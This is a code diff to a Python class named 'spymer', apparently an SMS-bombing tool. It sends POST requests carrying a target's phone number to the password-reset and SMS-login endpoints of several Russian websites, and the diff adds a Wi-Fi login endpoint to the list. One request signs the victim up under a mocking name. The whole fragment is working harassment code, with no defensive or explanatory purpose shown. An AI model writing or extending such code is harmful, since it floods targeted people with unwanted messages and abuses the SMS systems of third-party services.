@@ -61,6 +61,7 @@ class spymer:
 			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
 			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
 			rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
+			wifimetro = requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone})
 			if _name == None:
 				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Путин тебя любит ♥','phone': _phone})
 			else:
